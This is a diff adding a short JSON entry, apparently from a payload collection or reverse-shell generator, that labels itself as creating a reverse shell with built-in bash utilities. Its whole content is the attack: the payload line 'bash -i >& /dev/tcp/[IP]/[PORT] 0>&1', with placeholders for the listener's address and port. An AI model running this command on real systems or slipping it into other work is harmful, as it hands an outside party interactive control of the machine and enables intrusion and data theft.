@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "Creates a reverse shell via builtin bash utilities",
+      "type": "reverse",
+      "exec": "bash"
+    },
+    "payload": "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"
+  }
+}
